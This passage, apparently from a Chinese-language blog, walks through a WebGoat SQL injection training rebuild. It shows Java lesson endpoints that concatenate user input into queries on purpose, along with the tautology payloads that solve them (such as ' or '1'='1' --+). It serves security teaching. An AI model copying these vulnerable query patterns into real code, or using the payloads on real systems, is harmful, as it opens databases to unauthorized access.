class="type">boolean</span> <span class="title function_">checkSolution</span><span class="params">(Connection connection)</span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">var</span> <span class="variable">stmt</span> <span class="operator">=</span> connection.prepareStatement(<span class="string">&quot;select  * from information_schema.table_privileges where table_name = ? and grantee = ?&quot;</span>);</span><br><span class="line"><span class="comment">//          查询是否有权限</span></span><br><span class="line">            stmt.setString(<span class="number">1</span>,<span class="string">&quot;GRANT_RIGHTS&quot;</span>);</span><br><span class="line">            stmt.setString(<span class="number">2</span>,<span class="string">&quot;UNAUTHORIZED_USER&quot;</span>);</span><br><span class="line">            <span class="type">var</span> <span class="variable">resultSet</span> <span class="operator">=</span> stmt.executeQuery();</span><br><span class="line">            <span class="keyword">return</span> resultSet.next();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (SQLException e) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里是进行权限的授予</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">grant all privileges on grant_rights to unauthorized_user</span><br></pre></td></tr></table></figure>

<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220907200019144.png" alt="image-20220907200019144"></p>
<h4 id="SqlInjectionLesson5a"><a href="#SqlInjectionLesson5a" class="headerlink" title="SqlInjectionLesson5a"></a>SqlInjectionLesson5a</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.wanan.webgoat.lessons.sql_injection.introduction;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.LessonDataSource;</span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.assignments.AssignmentEndpoint;</span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.assignments.AssignmentHints;</span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.assignments.AttackResult;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.PostMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestParam;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.ResponseBody;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RestController;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.sql.*;</span><br><span class="line"></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="meta">@AssignmentHints(value = &#123;&quot;SqlStringInjectionHint5a1&quot;&#125;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SqlInjectionLesson5a</span> <span class="keyword">extends</span> <span class="title class_">AssignmentEndpoint</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">EXPLANATION</span> <span class="operator">=</span> <span class="string">&quot;&lt;br&gt; Explanation: This injection works, because &lt;span style=\&quot;font-style: italic\&quot;&gt;or &#x27;1&#x27; = &#x27;1&#x27;&lt;/span&gt; &quot;</span></span><br><span class="line">            + <span class="string">&quot;always evaluates to true (The string ending literal for &#x27;1 is closed by the query itself, so you should not inject it). &quot;</span></span><br><span class="line">            + <span class="string">&quot;So the injected query basically looks like this: &lt;span style=\&quot;font-style: italic\&quot;&gt;SELECT * FROM user_data WHERE first_name = &#x27;John&#x27; and last_name = &#x27;&#x27; or TRUE&lt;/span&gt;, &quot;</span></span><br><span class="line">            + <span class="string">&quot;which will always evaluate to true, no matter what came before it.&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> LessonDataSource dataSource;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">SqlInjectionLesson5a</span><span class="params">(LessonDataSource dataSource)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.dataSource = dataSource;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@PostMapping(&quot;/SqlInjection/assignment5a&quot;)</span></span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="keyword">public</span> AttackResult <span class="title function_">completed</span><span class="params">(<span class="meta">@RequestParam</span> String account, <span class="meta">@RequestParam</span> String operator, <span class="meta">@RequestParam</span> String injection)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> injectableQuery(account + <span class="string">&quot; &quot;</span> + operator + <span class="string">&quot; &quot;</span> + injection);</span><br><span class="line"><span class="comment">//        将获取到的三个请求参数进行拼接</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> AttackResult <span class="title function_">injectableQuery</span><span class="params">(String accountName)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">query</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">try</span> (<span class="type">Connection</span> <span class="variable">connection</span> <span class="operator">=</span> dataSource.getConnection()) &#123;</span><br><span class="line">            query = <span class="string">&quot;SELECT * FROM user_data where first_name = &#x27;John&#x27; and last_name= &#x27;&quot;</span> + accountName + <span class="string">&quot;&#x27;&quot;</span>;</span><br><span class="line"><span class="comment">//            查询语句</span></span><br><span class="line">            <span class="keyword">try</span> (<span class="type">Statement</span> <span class="variable">statement</span> <span class="operator">=</span> connection.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE, ResultSet.CONCUR_READ_ONLY)) &#123;</span><br><span class="line">                <span class="type">ResultSet</span> <span class="variable">results</span> <span class="operator">=</span> statement.executeQuery(query);</span><br><span class="line">                <span class="keyword">if</span> ((results != <span class="literal">null</span>) &amp;&amp; (results.first())) &#123;</span><br><span class="line"><span class="comment">//                    将光标移动到ResultSet对象的第一个</span></span><br><span class="line">                    <span class="type">ResultSetMetaData</span> <span class="variable">resultSetMetaData</span> <span class="operator">=</span> results.getMetaData();</span><br><span class="line"><span class="comment">//                    检索词对象列的属性</span></span><br><span class="line">                    <span class="type">StringBuffer</span> <span class="variable">output</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuffer</span>();</span><br><span class="line">                    output.append(wirteTable(results, resultSetMetaData));</span><br><span class="line">                    results.last();</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span> (results.getRow() &gt;= <span class="number">6</span>) &#123;</span><br><span class="line">                        <span class="keyword">return</span> success(<span class="built_in">this</span>).feedback(<span class="string">&quot;sql-injection.5a.success&quot;</span>).output(<span class="string">&quot;Your query was: &quot;</span> + query + EXPLANATION).feedbackArgs(output.toString()).build();</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        <span class="keyword">return</span> failed(<span class="built_in">this</span>).output(output.toString() + <span class="string">&quot;&lt;br&gt; Your query was: &quot;</span> + query).build();</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">return</span> failed(<span class="built_in">this</span>).feedback(<span class="string">&quot;sql-injection.5a.no.results&quot;</span>).output(<span class="string">&quot;Your query was: &quot;</span> + query).build();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (SQLException sqle) &#123;</span><br><span class="line">            <span class="keyword">return</span> failed(<span class="built_in">this</span>).output(sqle.getMessage() + <span class="string">&quot;&lt;br&gt; Your query was: &quot;</span> + query).build();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="keyword">return</span> failed(<span class="built_in">this</span>).output(<span class="built_in">this</span>.getClass().getName() + <span class="string">&quot; : &quot;</span> + e.getMessage() + <span class="string">&quot;&lt;br&gt; Your query was: &quot;</span> + query).build();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String  <span class="title function_">wirteTable</span><span class="params">(ResultSet results,ResultSetMetaData resultSetMetaData)</span><span class="keyword">throws</span> SQLException&#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">numColumns</span> <span class="operator">=</span> resultSetMetaData.getColumnCount();</span><br><span class="line"><span class="comment">//        获取列数</span></span><br><span class="line">        results.beforeFirst();</span><br><span class="line">        <span class="type">StringBuffer</span> <span class="variable">t</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuffer</span>();</span><br><span class="line">        t.append(<span class="string">&quot;&lt;p&gt;&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (results.next())&#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span><span class="number">1</span>;i&lt;(numColumns + <span class="number">1</span>);i++)&#123;</span><br><span class="line">                t.append(resultSetMetaData.getColumnName(i));</span><br><span class="line">                t.append(<span class="string">&quot;, &quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            t.append(<span class="string">&quot;&lt;br /&gt;&quot;</span>);</span><br><span class="line">            results.beforeFirst();</span><br><span class="line">            <span class="keyword">while</span> (results.next())&#123;</span><br><span class="line">                <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>;i&lt;(numColumns + <span class="number">1</span>);i++)&#123;</span><br><span class="line">                    t.append(results.getString(i));</span><br><span class="line">                    t.append(<span class="string">&quot;, &quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                t.append(<span class="string">&quot;&lt;br /&gt;&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            t.append(<span class="string">&quot;Query Successful;however no data was returned from this query.&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        t.append(<span class="string">&quot;&lt;/p&gt;&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> (t.toString());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220908100816364.png" alt="image-20220908100816364"></p>
<p>简单的一个万能密码</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220908100907161.png" alt="image-20220908100907161"></p>
<h4 id="SqlInjectionLesson5b"><a href="#SqlInjectionLesson5b" class="headerlink" title="SqlInjectionLesson5b"></a>SqlInjectionLesson5b</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.wanan.webgoat.lessons.sql_injection.introduction;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.LessonDataSource;</span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.assignments.AssignmentEndpoint;</span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.assignments.AssignmentHints;</span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.assignments.AttackResult;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.PostMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestParam;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.ResponseBody;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RestController;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.sql.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> java.sql.ResultSet.TYPE_SCROLL_INSENSITIVE;</span><br><span class="line"></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="meta">@AssignmentHints(value = &#123;&quot;SqlStringInjectionHint5b1&quot;, &quot;SqlStringInjectionHint5b2&quot;, &quot;SqlStringInjectionHint5b3&quot;, &quot;SqlStringInjectionHint5b4&quot;&#125;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SqlInjectionLesson5b</span> <span class="keyword">extends</span> <span class="title class_">AssignmentEndpoint</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> LessonDataSource dataSource;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">SqlInjectionLesson5b</span><span class="params">(LessonDataSource dataSource)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.dataSource = dataSource;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@PostMapping(&quot;/SqlInjection/assignment5b&quot;)</span></span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="keyword">public</span> AttackResult <span class="title function_">completed</span><span class="params">(<span class="meta">@RequestParam</span> String userid, <span class="meta">@RequestParam</span> String login_count, HttpServletRequest request)</span><span class="keyword">throws</span> IOException&#123;</span><br><span class="line">        <span class="keyword">return</span> injectalbeQuery(login_count,userid);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> AttackResult <span class="title function_">injectalbeQuery</span><span class="params">(String login_count, String userid)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">queryString</span> <span class="operator">=</span> <span class="string">&quot;SELECT * FROM user_data WHERE Login_Count = ? and userid = &quot;</span>+userid;</span><br><span class="line"><span class="comment">//        这里只进行了一个 字符的预编译</span></span><br><span class="line">        <span class="keyword">try</span> (<span class="type">Connection</span> <span class="variable">connection</span> <span class="operator">=</span> dataSource.getConnection())&#123;</span><br><span class="line">            <span class="type">PreparedStatement</span> <span class="variable">query</span> <span class="operator">=</span> connection.prepareStatement(queryString,TYPE_SCROLL_INSENSITIVE, ResultSet.CONCUR_UPDATABLE);</span><br><span class="line">            <span class="type">int</span> <span class="variable">count</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                count = Integer.parseInt(login_count);</span><br><span class="line"><span class="comment">//                将预编译语句类型规定为int 并传入 login_count参数</span></span><br><span class="line">            &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">                <span class="keyword">return</span> failed(<span class="built_in">this</span>).output(<span class="string">&quot;Could not parse: &quot;</span>+login_count + <span class="string">&quot; to a number&quot;</span> + <span class="string">&quot;&lt;br&gt; Your query was: &quot;</span>+queryString.replace(<span class="string">&quot;?&quot;</span>,login_count)).build();</span><br><span class="line">            &#125;</span><br><span class="line">            query.setInt(<span class="number">1</span>,count);</span><br><span class="line"><span class="comment">//            将参数添加到sql语句中</span></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="type">ResultSet</span> <span class="variable">results</span> <span class="operator">=</span> query.executeQuery();</span><br><span class="line">                <span class="keyword">if</span> ((results != <span class="literal">null</span>)&amp;&amp; (results.first() == <span class="literal">true</span>))&#123;</span><br><span class="line">                    <span class="type">ResultSetMetaData</span> <span class="variable">resultSetMetaData</span> <span class="operator">=</span> results.getMetaData();</span><br><span class="line">                    <span class="type">StringBuffer</span> <span class="variable">output</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuffer</span>();</span><br><span class="line"></span><br><span class="line">                    output.append(SqlInjectionLesson5a.wirteTable(results,resultSetMetaData));</span><br><span class="line">                    results.last();</span><br><span class="line">                    <span class="keyword">if</span> (results.getRow() &gt;= <span class="number">6</span>)&#123;</span><br><span class="line">                        <span class="keyword">return</span> success(<span class="built_in">this</span>).feedback(<span class="string">&quot;sql-injection.5b.success&quot;</span>).output(<span class="string">&quot;You query was: &quot;</span>+queryString.replace(<span class="string">&quot;?&quot;</span>,login_count)).feedbackArgs(output.toString()).build();</span><br><span class="line">                    &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">                        <span class="keyword">return</span> failed(<span class="built_in">this</span>).output(output.toString() + <span class="string">&quot;&lt;br&gt; Your query was: &quot;</span>+ queryString.replace(<span class="string">&quot;?&quot;</span>,login_count)).build();</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">return</span> failed(<span class="built_in">this</span>).feedback(<span class="string">&quot;sql-injection.5b.no.results&quot;</span>).output(<span class="string">&quot;Your query was: &quot;</span>+queryString.replace(<span class="string">&quot;?&quot;</span>,login_count)).build();</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">            &#125;<span class="keyword">catch</span> (SQLException sqle)&#123;</span><br><span class="line">                <span class="keyword">return</span> failed(<span class="built_in">this</span>).output(sqle.getMessage() + <span class="string">&quot;&lt;br&gt; Your query was: &quot;</span>+ queryString.replace(<span class="string">&quot;?&quot;</span>,login_count)).build();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            <span class="keyword">return</span> failed(<span class="built_in">this</span>).output(<span class="built_in">this</span>.getClass().getName()+<span class="string">&quot; : &quot;</span>+e.getMessage() + <span class="string">&quot;&lt;br&gt; Your query was: &quot;</span>+ queryString.replace(<span class="string">&quot;?&quot;</span>,login_count)).build();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>操作差不多</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1 or 1=1</span><br></pre></td></tr></table></figure>

<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220908122215280.png" alt="image-20220908122215280"></p>
<h4 id="SqlInjectionLesson8-1"><a href="#SqlInjectionLesson8-1" class="headerlink" title="SqlInjectionLesson8"></a>SqlInjectionLesson8</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.wanan.webgoat.lessons.sql_injection.introduction;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.LessonDataSource;</span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.assignments.AssignmentEndpoint;</span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.assignments.AssignmentHints;</span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.assignments.AttackResult;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.PostMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestParam;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.ResponseBody;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RestController;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.sql.*;</span><br><span class="line"><span class="keyword">import</span> java.text.SimpleDateFormat;</span><br><span class="line"><span class="keyword">import</span> java.util.Calendar;</span><br><span class="line"></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="meta">@AssignmentHints(value = &#123;&quot;SqlStringInjectionHint.8.1&quot;, &quot;SqlStringInjectionHint.8.2&quot;, &quot;SqlStringInjectionHint.8.3&quot;, &quot;SqlStringInjectionHint.8.4&quot;, &quot;SqlStringInjectionHint.8.5&quot;&#125;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SqlInjectionLesson8</span> <span class="keyword">extends</span> <span class="title class_">AssignmentEndpoint</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> LessonDataSource dataSource;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">SqlInjectionLesson8</span><span class="params">(LessonDataSource dataSource)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.dataSource = dataSource;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@PostMapping(&quot;/SqlInjection/attack8&quot;)</span></span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="keyword">public</span> AttackResult <span class="title function_">completed</span><span class="params">(<span class="meta">@RequestParam</span> String name,<span class="meta">@RequestParam</span> String auth_tan)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> injectableQueryConfidentiality(name,auth_tan);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">protected</span> AttackResult <span class="title function_">injectableQueryConfidentiality</span><span class="params">(String name,String auth_tan)</span>&#123;</span><br><span class="line">        <span class="type">StringBuffer</span> <span class="variable">output</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuffer</span>();</span><br><span class="line">        <span class="type">String</span> <span class="variable">query</span> <span class="operator">=</span> <span class="string">&quot;SELECT * FROM employees WHERE last_name = &#x27;&quot;</span> + name + <span class="string">&quot;&#x27;AND auth_tan = &#x27;&quot;</span>+auth_tan + <span class="string">&quot;&#x27;&quot;</span>;</span><br><span class="line">        <span class="keyword">try</span>(<span class="type">Connection</span> <span class="variable">connection</span> <span class="operator">=</span> dataSource.getConnection())&#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="type">Statement</span> <span class="variable">statement</span> <span class="operator">=</span> connection.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,ResultSet.CONCUR_READ_ONLY);</span><br><span class="line">                log(connection,query);</span><br><span class="line">                ResultSet results= statement.executeQuery(query);</span><br><span class="line">                <span class="keyword">if</span> (results.getStatement() != <span class="literal">null</span>)&#123;</span><br><span class="line">                    <span class="keyword">if</span> (results.first())&#123;</span><br><span class="line">                        output.append(generateTable(results));</span><br><span class="line">                        results.last();</span><br><span class="line"></span><br><span class="line">                        <span class="keyword">if</span> (results.getRow() &gt; <span class="number">1</span>)&#123;</span><br><span class="line"><span class="comment">//                        超过一条记录</span></span><br><span class="line">                            <span class="keyword">return</span> success(<span class="built_in">this</span>).feedback(<span class="string">&quot;sql-injection.8.success&quot;</span>).output(output.toString()).build();</span><br><span class="line">                        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line"><span class="comment">//                            只有一条记录</span></span><br><span class="line">                            <span class="keyword">return</span> failed(<span class="built_in">this</span>).feedback(<span class="string">&quot;sql-injection.8.one&quot;</span>).output(output.toString()).build();</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;<span class="keyword">else</span> &#123;</span><br><span class="line"><span class="comment">//                        没有结果</span></span><br><span class="line">                        <span class="keyword">return</span> failed(<span class="built_in">this</span>).feedback(<span class="string">&quot;sql-injection.8.no.results&quot;</span>).build();</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">return</span> failed(<span class="built_in">this</span>).build();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;<span class="keyword">catch</span> (SQLException e)&#123;</span><br><span class="line">                <span class="keyword">return</span> failed(<span class="built_in">this</span>).output(<span class="string">&quot;&lt;br&gt;&lt;span class=&#x27;feedback-negative&#x27;&gt;&quot;</span> + e.getMessage()+<span class="string">&quot;&lt;/span&gt;&quot;</span>).build();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            <span class="keyword">return</span> failed(<span class="built_in">this</span>).output(<span class="string">&quot;&lt;br&gt;&lt;span class=&#x27;feedback-negative&#x27;&gt;&quot;</span>+e.getMessage()+<span class="string">&quot;&lt;/span&gt;&quot;</span>).build();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">generateTable</span><span class="params">(ResultSet results)</span><span class="keyword">throws</span> SQLException&#123;</span><br><span class="line">        <span class="type">ResultSetMetaData</span>  <span class="variable">resultSetMetaData</span> <span class="operator">=</span> results.getMetaData();</span><br><span class="line"><span class="comment">//        检索数据库中的数据</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">numColumns</span> <span class="operator">=</span> resultSetMetaData.getColumnCount();</span><br><span class="line"><span class="comment">//        获取其中的列数</span></span><br><span class="line">        results.beforeFirst();</span><br><span class="line"><span class="comment">//        将光标移动到第一行前面</span></span><br><span class="line">        <span class="type">StringBuilder</span> <span class="variable">table</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line"><span class="comment">//</span></span><br><span class="line">        table.append(<span class="string">&quot;&lt;table&gt;&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (results.next())&#123;</span><br><span class="line"><span class="comment">//          如果结果集中存在值</span></span><br><span class="line">            table.append(<span class="string">&quot;&lt;tr&gt;&quot;</span>);</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt; (numColumns + <span class="number">1</span>);i ++ )&#123;</span><br><span class="line"><span class="comment">//                进行计数输出</span></span><br><span class="line">                table.append(<span class="string">&quot;&lt;tr&gt;&quot;</span> + resultSetMetaData.getColumnName(i) + <span class="string">&quot;&lt;/th&gt;&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            table.append(<span class="string">&quot;&lt;/tr&gt;&quot;</span>);</span><br><span class="line">            results.beforeFirst();</span><br><span class="line"><span class="comment">//            这里也是重新回到第一个</span></span><br><span class="line">            <span class="keyword">while</span> (results.next())&#123;</span><br><span class="line">                table.append(<span class="string">&quot;&lt;tr&gt;&quot;</span>);</span><br><span class="line">                <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>;i&lt; (numColumns + <span class="number">1</span>); i++ )&#123;</span><br><span class="line"><span class="comment">//                    这里是对数据库中查到的数据进行输出</span></span><br><span class="line">                    table.append(<span class="string">&quot;&lt;td&gt;&quot;</span> + results.getString(i) + <span class="string">&quot;&lt;/td&gt;&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                table.append(<span class="string">&quot;&lt;/tr&gt;&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            table.append(<span class="string">&quot;Query Successful; however no data was returned form this query.&quot;</span>);</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        table.append(<span class="string">&quot;&lt;/table&gt;&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> (table.toString());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">log</span><span class="params">(Connection connection,String action)</span>&#123;</span><br><span class="line">        action =action.replace(<span class="string">&#x27;\&#x27;&#x27;</span>,<span class="string">&#x27;&quot;&#x27;</span>);</span><br><span class="line">        <span class="type">Calendar</span> <span class="variable">cal</span> <span class="operator">=</span> Calendar.getInstance();</span><br><span class="line"><span class="comment">//        用于获取当前时间</span></span><br><span class="line">        <span class="type">SimpleDateFormat</span> <span class="variable">sdf</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SimpleDateFormat</span>(<span class="string">&quot;yyy-MM-dd HH:mm:ss&quot;</span>);</span><br><span class="line"><span class="comment">//        进行时间格式化</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">time</span> <span class="operator">=</span> sdf.format(cal.getTime());</span><br><span class="line">        <span class="type">String</span> <span class="variable">logQuery</span> <span class="operator">=</span> <span class="string">&quot;INSERT INTO access_log (time,action) VALUES (&#x27;&quot;</span>+time+<span class="string">&quot;&#x27;,&#x27;&quot;</span>+action+<span class="string">&quot;&#x27;)&quot;</span>;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="type">Statement</span> <span class="variable">statement</span> <span class="operator">=</span> connection.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,ResultSet.CONCUR_UPDATABLE);</span><br><span class="line">            statement.executeUpdate(logQuery);</span><br><span class="line"><span class="comment">//                    CONCUR_UPDATABLE 能用结果集更新表中数据</span></span><br><span class="line">        &#125; <span class="keyword">catch</span> (SQLException e) &#123;</span><br><span class="line">            System.err.print(e.getMessage());</span><br><span class="line"><span class="comment">//            有颜色的输出 报错专用</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; or &#x27;1&#x27;=&#x27;1&#x27; --+ </span><br></pre></td></tr></table></figure>

<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220908122832409.png" alt="image-20220908122832409"></p>
<h4 id="SqlInjectionLesson9"><a href="#SqlInjectionLesson9" class="headerlink" title="SqlInjectionLesson9"></a>SqlInjectionLesson9</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.wanan.webgoat.lessons.sql_injection.introduction;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.LessonDataSource;</span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.assignments.AssignmentEndpoint;</span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.assignments.AssignmentHints;</span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.assignments.AttackResult;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.sql.Connection;</span><br><span class="line"><span class="keyword">import</span> java.sql.ResultSet;</span><br><span class="line"><span class="keyword">import</span> java.sql.SQLException;</span><br><span class="line"><span class="keyword">import</span> java.sql.Statement;</span><br><span class="line"></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span 